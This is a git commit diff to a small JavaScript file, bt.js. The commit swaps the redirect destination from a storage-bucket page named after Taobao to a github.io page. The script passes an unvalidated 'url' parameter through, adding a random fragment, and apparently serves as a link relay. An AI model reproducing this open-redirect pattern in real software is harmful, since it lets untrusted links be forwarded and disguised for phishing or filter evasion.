1f1780f39e00b55536e1e9938b1d89e8ef4b465e
xigua789 <123617033+xigua789@users.noreply.github.com>
2024-07-11 17:56:14 +0800

    Add files via upload

--- bt.js
+++ bt.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "//taobao-1256419338.cos.ap-nanjing.myqcloud.com/f.html";
+let redirectURL = "https://xigua789.github.io/f.html";
 // https://static.ylxweb.com/upload/xinyue/2024/FlOoFt0jr9OpaT9jitYy8YNZHsuA.html
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
